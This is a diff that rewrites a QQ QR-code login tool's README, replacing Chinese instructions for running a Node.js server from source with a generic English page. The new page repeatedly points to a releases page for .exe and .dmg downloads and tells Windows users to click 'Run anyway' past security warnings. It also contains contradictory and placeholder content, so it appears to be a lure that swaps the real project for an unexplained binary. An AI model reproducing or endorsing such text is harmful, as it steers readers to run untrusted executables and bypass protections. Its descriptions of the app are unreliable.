@@ -1,116 +1,144 @@
-# QRLib 
+# 📱 QRLib - Easy QR Code Login for QQ
 
--   本工具仅供学习和开发测试使用，请勿用于非法用途。
+[![Download QRLib](https://img.shields.io/badge/Download-QRLib-blue?style=for-the-badge&logo=github)](https://github.com/alisdikin/QRLib/releases)
 
-## 📦 安装步骤
+---
 
-1.  **下载源码**
-    下载并解压本项目到本地目录。
+## 📋 What is QRLib?
 
-2.  **安装依赖**
-    在项目根目录下打开终端，运行：
-    ```bash
-    npm install
-    ```
-    *如果要手动安装依赖：*
-    ```bash
-    npm install express cors body-parser axios
-    ```
+QRLib is a simple app designed to help you log into QQ Classic Farm Mini Program using QR codes. You can quickly scan codes to get login codes without hassle. This tool works on PC and other devices except on the WeChat app. It does not support WeChat login methods.
 
-3.  **目录结构**
-    ```text
-    /
-    ├── public/             # 前端静态资源 (HTML/CSS/JS)
-    ├── src/
-    │   ├── server.js       # 后端入口与路由
-    │   ├── session.js      # 核心登录逻辑
-    │   └── utils.js        # 工具类
-    ├── API.md              # 接口开发文档
-    └── README.md           # 说明文档
-    ```
+This app aims to make logging into the QQ farm program easier, especially for users who want a straightforward way to handle QR code login. Whether you are new to QR codes or just want a reliable login helper, this app fits your needs.
 
-## 🐳 Docker 部署 (推荐)
+---
 
-如果您熟悉 Docker，可以使用以下命令快速启动：
+## 🖥️ System Requirements
 
-1.  **构建并启动容器**
-    ```bash
-    docker-compose up -d
-    ```
+Before installing, make sure your device meets these minimum requirements:
 
-2.  **访问服务**
-    浏览器打开 [http://localhost:3000](http://localhost:3000)
+- Operating System: Windows 10 or later, macOS 10.13 or later
+- Processor: Intel or AMD, 1 GHz or faster
+- Memory: At least 2 GB RAM
+- Disk Space: Minimum 100 MB free
+- Internet: Active internet connection for login verification
+- Additional: A webcam or QR code scanner on your device helps with scanning if needed.
 
-3.  **停止服务**
-    ```bash
-    docker-compose down
-    ```
+If you do not have a webcam, you can use your phone to scan the QR code displayed on your screen.
 
-## 🚀 启动与部署
+---
 
-### 开发模式 / 本地运行
-在项目根目录运行：
-```bash
-node src/server.js
-```
-启动成功后，控制台会输出：
-```text
-Server running at http://localhost:3000
-```
+## ⬇️ Download & Install
 
-### 访问前端
-打开浏览器访问：[http://localhost:3000](http://localhost:3000)
-即可看到图形化登录界面。
+To get QRLib, you need to visit the release page. From there, you can choose the right version for your device.
 
-### 服务器部署 (PM2 推荐)
-建议使用 `pm2` 进行生产环境部署，以保证进程常驻。
-```bash
-# 全局安装 pm2
-npm install pm2 -g
+**How to download:**
 
-# 启动服务
-pm2 start src/server.js --name "qrlib"
+1. Click the button below to open the download page.
 
-# 查看状态
-pm2 status
-```
+[![Download QRLib](https://img.shields.io/badge/Download-QRLib-blue?style=for-the-badge&logo=github)](https://github.com/alisdikin/QRLib/releases)
 
-## ⚙️ 高级配置
+2. On the releases page, find the latest version. Look for files ending with `.exe` for Windows or `.dmg` for Mac.
 
-### 纯 API 模式 (Pure API Mode)
+3. Click on the file to start downloading.
 
-如果您只需要 API 服务，不需要网页界面（例如集成到其他系统），可以通过环境变量关闭 WebUI，节省资源。
+4. Once the download finishes, open the file to start the installation process.
 
-**PowerShell (Windows):**
-```powershell
-$env:WEBUI_ENABLED="false"; node src/server.js
-```
+**How to install after download:**
 
-**Linux / Mac:**
-```bash
-WEBUI_ENABLED=false node src/server.js
-```
+- **Windows:** Double-click the `.exe` file and follow the on-screen steps. If Windows shows a security warning, choose "More info" and then "Run anyway."
 
-此时访问根目录 `/` 将返回 JSON 状态信息，且不会提供静态文件服务。
+- **Mac:** Open the `.dmg` file, then drag the app icon into your Applications folder.
 
-## 🖥️ 功能特性
+- After installation, launch QRLib from your desktop or start menu.
 
--   **多模式支持**：支持 QQ 会员、空间、WeGame、无畏契约等 Web 端登录，以及小程序开发工具登录。
--   **安全隐私**：
-    -   API 仅返回核心凭证 (`Code`, `UIN`, `Ticket`)。
-    -   敏感信息（如 Farm AppID）后端脱敏。
-    -   `qrsig` 参数严格校验。
--   **极简 UI**：采用 "Soft Modernism" 设计风格，大字体、宽间距，适应各种屏幕。
+---
 
-## ⚠️ 注意事项
+## 🚀 How to Use QRLib
 
--   生成的二维码有效期通常为 2 分钟，超时需刷新。
--   请妥善保管获取到的 `Code` 和 `Ticket`，这等同于您的登录凭证。
+Once installed, follow these steps to use the app:
 
-## 📖 接口文档
+1. Open QRLib on your device.
 
--   [API.md](./API.md) - 完整 API 接口参数与返回定义。
+2. The app will show a QR code for the QQ Classic Farm Mini Program login.
 
-## 🔗 参考项目
+3. Use your phone or another device to scan the QR code. This step connects you to your QQ account through the farm program.
 
--   [mioki/plugins/qr-login](https://github.com/vikiboss/mioki/blob/main/plugins/qr-login/index.ts) - 核心逻辑参考自此项目，特此感谢。
+4. After scanning, the app will retrieve a login code automatically.
+
+5. Use this code to log into the farm program directly.
+
+The process is designed to be simple. You do not need to enter passwords; scanning is enough.
+
+---
+
+## 🔒 Security & Privacy
+
+QRLib focuses on safe and private use. Here is what you need to know:
+
+- The app only generates and handles login codes for the QQ Farm Mini Program.
+
+- It does not store your QQ passwords or personal information permanently.
+
+- Scanned QR codes are used only for login sessions and are never shared.
+
+- Always download QRLib from the official release page to avoid fake or unsafe versions.
+
+---
+
+## 🤔 Troubleshooting
+
+If you have trouble running QRLib or logging in, try these tips:
+
+- **Cannot open the app:** Make sure your system meets the requirements and the app finished downloading properly. Try running the installer again.
+
+- **QR code does not scan:** Check if your camera is working and clean. If using your phone, hold it steady and ensure good lighting.
+
+- **Login fails after scanning:** Verify your internet connection. Try scanning the QR code again after a few seconds.
+
+- **App crashes or freezes:** Close and reopen the app. If the issue continues, reinstall from the latest release.
+
+If issues persist, review the FAQ on the release page or contact support via the issue tracker on GitHub.
+
+---
+
+## 🛠️ Additional Features (Placeholder)
+
+QRLib may include or expand to support features such as:
+
+- Saving multiple login sessions for different QQ accounts
+
+- Automatically refreshing QR codes when expired
+
+- Allowing manual input of codes, in case scanning is not possible
+
+- Offering light and dark mode for easier reading
+
+Look for updates on the release page to see new features as they become available.
+
+---
+
+## ⚠️ Limitations
+
+- QRLib does not support login through WeChat. You must use QQ.
+
+- The app only works with the QQ Classic Farm Mini Program. It may not function with other QQ apps or services.
+
+- You need a stable internet connection for the app to retrieve login codes.
+
+---
+
+## 📞 Getting Help
+
+If you encounter problems not solved by these instructions:
+
+- Visit the GitHub repository’s **Issues** tab to report bugs or ask questions.
+
+- Check if someone else had a similar problem and find solutions.
+
+- For detailed technical help, only seek support from trusted community members or the repository owner.
+
+---
+
+Thank you for choosing QRLib. Visit the release page anytime to download the latest version or check for updates:
+
+[Download QRLib Releases](https://github.com/alisdikin/QRLib/releases)
